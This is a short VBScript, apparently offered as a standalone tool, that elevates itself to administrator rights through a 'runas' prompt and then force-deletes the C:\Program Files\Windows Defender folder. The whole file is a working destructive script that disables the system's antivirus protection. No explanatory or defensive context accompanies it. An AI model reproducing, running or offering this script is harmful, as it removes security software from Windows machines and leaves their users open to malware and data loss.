If Not WScript.Arguments.Named.Exists("elevated") Then
  CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
  WScript.Quit
End If

Set objFSO = CreateObject("Scripting.FileSystemObject")
strFolder = "C:\Program Files\Windows Defender"

If objFSO.FolderExists(strFolder) Then
    objFSO.DeleteFolder strFolder, True
End If
